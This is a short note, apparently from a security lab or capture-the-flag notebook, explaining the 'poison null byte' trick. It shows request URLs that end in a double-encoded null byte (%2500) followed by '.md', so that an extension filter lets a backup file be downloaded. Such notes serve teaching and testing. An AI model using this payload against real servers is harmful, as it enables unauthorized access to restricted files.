# Poison Null Byte
In case few extensions are authorized, a null byte might do the trick to finish the URL with an expected extension, but load a file that is defined before the null byte

Example:
http://X.X.X.X/ftp/package.json.bak (fail, because not finishing by .md)
=>
http://X.X.X.X/ftp/package.json.bak%00.md (fail, because the null byte must be encoded, so % becomes %25)
=>
http://X.X.X.X/ftp/package.json.bak%2500.md